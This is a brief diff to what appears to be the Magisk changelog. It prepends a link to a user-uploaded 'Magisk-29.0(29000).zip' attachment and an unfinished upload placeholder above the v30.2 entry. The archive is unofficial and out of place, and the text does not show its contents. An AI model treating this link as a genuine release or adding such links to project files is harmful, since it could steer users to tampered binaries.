@@ -1,3 +1,5 @@
+[Magisk-29.0(29000).zip](https://github.com/user-attachments/files/22586420/Magisk-29.0.29000.zip)
+[Uploading Magisk-29.0(29000).zip…]()
 # Magisk Changelog
 
 ### v30.2 (2025.8.6)
